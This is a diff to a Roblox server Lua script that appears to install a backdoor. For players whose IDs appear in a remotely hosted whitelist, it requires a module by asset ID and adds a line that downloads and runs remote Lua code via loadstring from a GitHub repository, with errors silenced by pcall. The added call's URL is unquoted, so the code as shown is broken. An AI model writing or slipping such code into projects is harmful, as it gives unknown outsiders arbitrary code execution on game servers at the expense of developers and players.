@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+
 local function getJson(url)
 	local ok, res = pcall(function()
 		return HttpService:JSONDecode(HttpService:GetAsync(url))
@@ -10,9 +11,11 @@ local function loadurl(url)
 	local ok, res = pcall(function()
 		return HttpService:GetAsync(url)
 	end)
-	if ok then loadstring(res)() end
+	if ok then pcall(function() loadstring(res)() end) end
 end
+
 local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
+
 local function onPlayer(player)
 	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 	if WL[tostring(player.UserId)] then
@@ -20,6 +23,7 @@ local function onPlayer(player)
 	  task.spawn(function() 
 			require(135231466738957):Hload(player.Name)
 	   end)
+		loadurl(https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua)
   	end
 end
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
